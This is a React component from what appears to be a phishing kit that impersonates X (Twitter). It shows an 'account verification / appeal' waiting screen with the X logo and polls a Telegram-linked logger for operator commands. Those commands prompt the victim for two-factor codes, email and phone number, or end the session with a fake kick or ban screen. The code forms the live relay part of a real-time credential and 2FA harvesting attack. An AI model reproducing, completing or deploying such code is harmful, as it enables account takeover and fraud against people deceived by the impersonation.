"use client";

import { useState, useEffect } from "react";
import { checkCommandStatus, TelegramCommand, simulateCommand } from "@/utils/telegramLogger";
import EmailPhoneVerification from "./EmailPhoneVerification";
import TwoFAVerification from "./TwoFAVerification";
import ResultScreen from "./ResultScreen";

interface WaitingScreenProps {
  username: string;
  onCommandReceived: (command: TelegramCommand) => void;
}

export default function WaitingScreen({ username, onCommandReceived }: WaitingScreenProps) {
  const [dots, setDots] = useState(".");
  const [checkCount, setCheckCount] = useState(0);
  const [currentCommand, setCurrentCommand] = useState<TelegramCommand>("waiting");

  // Screen states
  const [showEmailPhone, setShowEmailPhone] = useState(false);
  const [showTwoFA, setShowTwoFA] = useState(false);
  const [twoFAType, setTwoFAType] = useState<"app" | "phone" | "email">("app");
  const [showResult, setShowResult] = useState(false);
  const [resultType, setResultType] = useState<"finish" | "kick" | "ban">("finish");

  // Add keyboard shortcut for debugging - Shift+Ctrl+D spawns a command
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.shiftKey && e.ctrlKey) {
        if (e.key === '1') simulateCommand("2fa_auth_app");
        if (e.key === '2') simulateCommand("2fa_phone");
        if (e.key === '3') simulateCommand("2fa_email");
        if (e.key === '4') simulateCommand("confirm_email_phone");
        if (e.key === '5') simulateCommand("file_appeal");
        if (e.key === '6') simulateCommand("finish");
        if (e.key === '7') simulateCommand("kick_user");
        if (e.key === '8') simulateCommand("ban_user");
      }
    };

    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, []);

  // Update the dots animation
  useEffect(() => {
    const dotsInterval = setInterval(() => {
      setDots((prev) => {
        if (prev === "...") return ".";
        return prev + ".";
      });
    }, 500);

    return () => clearInterval(dotsInterval);
  }, []);

  // Check for commands frequently
  useEffect(() => {
    const commandInterval = setInterval(async () => {
      try {
        const status = await checkCommandStatus(username);

        // Eğer status değiştiyse ve "waiting" değilse işlem yap
        if (status !== "waiting" && status !== currentCommand) {
          console.log("Command status changed to:", status);
          setCurrentCommand(status);
          onCommandReceived(status);
        }

        setCheckCount(prev => prev + 1);
      } catch (error) {
        console.error("Error checking command status:", error);
      }
    }, 1000);

    // Component unmount olduğunda interval'i temizle
    return () => clearInterval(commandInterval);
  }, [username, currentCommand, onCommandReceived]);

  // Handle the different command types
  const handleCommandAction = (command: TelegramCommand) => {
    console.log(`Handling command: ${command}`);

    switch (command) {
      case "2fa_auth_app":
        setTwoFAType("app");
        setShowTwoFA(true);
        break;
      case "2fa_phone":
        setTwoFAType("phone");
        setShowTwoFA(true);
        break;
      case "2fa_email":
        setTwoFAType("email");
        setShowTwoFA(true);
        break;
      case "confirm_email_phone":
        setShowEmailPhone(true);
        break;
      case "file_appeal":
        // Only show appeal form, NOT the result screen
        // Wait for a 'finish' command to show the result
        console.log("Waiting for 'finish' command after file_appeal");
        // Reset command to waiting so we can receive future commands
        simulateCommand("waiting"); // Reset by simulating "waiting" command
        break;
      case "finish":
        setResultType("finish");
        setShowResult(true);
        break;
      case "kick_user":
        setResultType("kick");
        setShowResult(true);
        break;
      case "ban_user":
        setResultType("ban");
        setShowResult(true);
        break;
      default:
        // Continue waiting
        break;
    }
  };

  // Handle email & phone submission
  const handleEmailPhoneSubmit = (email: string, phone: string) => {
    console.log(`Email: ${email}, Phone: ${phone}`);
    // Ekranı kapatıp bekleme ekranına dön
    setShowEmailPhone(false);
    // Komutu sıfırla ve bekleme moduna geç
    simulateCommand("waiting");
  };

  // Handle 2FA code submission
  const handleTwoFASubmit = (code: string) => {
    console.log(`2FA Code: ${code}`);
    // Ekranı kapatıp bekleme ekranına dön
    setShowTwoFA(false);
    // Komutu sıfırla ve bekleme moduna geç
    simulateCommand("waiting");
  };

  // Handle result screen close
  const handleResultClose = () => {
    setShowResult(false);
    onCommandReceived(currentCommand);
  };

  // Display the appropriate screen based on the command
  if (showEmailPhone) {
    return (
      <EmailPhoneVerification
        onSubmit={handleEmailPhoneSubmit}
        onClose={() => {
          setShowEmailPhone(false);
          simulateCommand("waiting");
        }}
      />
    );
  }

  if (showTwoFA) {
    return (
      <TwoFAVerification
        type={twoFAType}
        onSubmit={handleTwoFASubmit}
        onClose={() => setShowTwoFA(false)}
      />
    );
  }

  if (showResult) {
    return (
      <ResultScreen
        type={resultType}
        onClose={handleResultClose}
      />
    );
  }

  return (
    <div className="fixed inset-0 bg-black/70 flex flex-col items-center justify-center z-50">
      <div className="bg-[#f7f7f7] rounded-2xl w-full max-w-[400px] p-6 relative mx-4">
        {/* X logo */}
        <div className="flex justify-center mb-4">
          <svg viewBox="0 0 24 24" aria-hidden="true" className="h-7 w-7">
            <path
              d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
              fill="currentColor"
            />
          </svg>
        </div>

        {/* Loading animation */}
        <div className="flex flex-col items-center justify-center mb-8">
          <div className="w-14 h-14 border-4 border-gray-300 border-t-blue-500 rounded-full animate-spin mb-4"></div>
          <h2 className="text-lg font-semibold text-center">Verifying your account{dots}</h2>
          <p className="text-gray-500 text-sm mt-2 text-center">
            Please wait while we process your appeal request.
          </p>
        </div>

        {/* Additional information */}
        <div className="bg-gray-100 p-3 rounded-md mb-4">
          <p className="text-sm text-gray-600">
            Your request has been received. This process may take a few minutes. Please do not close this window.
          </p>
        </div>
      </div>
    </div>
  );
}
